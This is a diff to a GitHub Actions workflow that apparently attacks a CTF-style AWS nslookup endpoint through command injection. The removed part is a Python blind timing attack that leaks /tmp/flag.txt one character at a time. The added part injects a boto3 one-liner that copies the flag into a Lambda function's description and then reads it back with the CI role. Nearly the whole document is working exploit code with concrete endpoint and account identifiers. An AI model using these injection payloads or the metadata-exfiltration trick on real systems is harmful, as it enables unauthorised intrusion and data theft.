@@ -19,65 +19,27 @@ jobs:
           role-to-assume: arn:aws:iam::009661764077:role/cicdRole
           aws-region: us-east-1
 
-      - name: Lightning-Fast Local Timing Extraction
+      - name: Direct URL-Decoded Exfiltration via Lambda Metadata
         run: |
-          python3 << 'PYEOF'
-          import subprocess
-          import json
-          import time
-
-          API_ID = "3q931syi7b"
-          REGION = "us-east-1"
-          URL = f"https://{API_ID}.execute-api.{REGION}.amazonaws.com/dev/nslookup"
-
-          def test_char(pos, mid):
-              idx = pos - 1
-              # Reads locally from /tmp/flag.txt for maximum speed and reliability!
-              domain = (
-                  f'127.0.0.1; '
-                  f'F=$(cat /tmp/flag.txt 2>/dev/null); '
-                  f'if [ -n "$F" ]; then '
-                  f'  printf \'%s\' "$F" | python3 -c "import sys; c=ord(sys.stdin.read()[{idx}]); sys.exit(0 if c>{mid} else 1)" && sleep 4; '
-                  f'fi'
-              )
-              payload = json.dumps({"domain": domain})
-              
-              start = time.time()
-              try:
-                  res = subprocess.run(
-                      ["curl", "-s", "--max-time", "5", "-X", "POST", URL,
-                       "-H", "Content-Type: application/json", "-d", payload],
-                      capture_output=True, text=True, timeout=10
-                  )
-                  elapsed = time.time() - start
-                  response = res.stdout
-              except subprocess.TimeoutExpired:
-                  elapsed = 10
-                  response = ""
-              
-              if elapsed >= 3.5 or not response or "wip" not in response:
-                  return True
-              return False
-
-          FLAG_LEN = 16
-          flag = []
+          API_ID="3q931syi7b"
+          REGION="us-east-1"
+          URL="https://${API_ID}.execute-api.${REGION}.amazonaws.com/dev/nslookup"
           
-          print("=== STARTING LOCAL TIMING EXTRACTION ===")
-          for pos in range(1, FLAG_LEN + 1):
-              print(f"Brute-forcing position {pos}...", flush=True)
-              low, high = 32, 126
-              while low < high:
-                  mid = (low + high) // 2
-                  if test_char(pos, mid):
-                      low = mid + 1
-                  else:
-                      high = mid
-              char = chr(low)
-              print(f">>> Position {pos} = '{char}' (ASCII {low})")
-              flag.append(char)
-              print(f"Flag so far: {''.join(flag)}")
-
-          print("\n=======================")
-          print(f"FINAL FLAG: {''.join(flag)}")
-          print("=======================")
-          PYEOF
+          echo "=== 1. INJECTING SCRIPT TO READ, DECODE, AND UPDATE LAMBDA DESCRIPTION ==="
+          # Read /tmp/flag.txt, URL-decode it using python's urllib.parse, and update function description
+          PAYLOAD='{"domain": "127.0.0.1; python3 -c \"import boto3, urllib.parse; f=open(\\\"/tmp/flag.txt\\\").read().strip(); decoded=urllib.parse.unquote(f); boto3.client(\\\'lambda\\\').update_function_configuration(FunctionName=\\\'nslookupv2\\\', Description=decoded)\""}'
+          
+          curl -s -X POST "$URL" \
+            -H "Content-Type: application/json" \
+            -d "$PAYLOAD"
+          
+          echo ""
+          echo "=== 2. WAITING 3 SECONDS FOR PROPAGATION ==="
+          sleep 3
+          
+          echo "=== 3. FETCHING DECODED FLAG VIA CICDROLE ==="
+          aws lambda get-function --function-name nslookupv2 --region ${REGION} --query 'Configuration.Description' --output text > ./the_flag.txt
+          
+          echo ""
+          echo "=== 4. BEHOLD YOUR HARD-EARNED VICTORY ==="
+          cat ./the_flag.txt
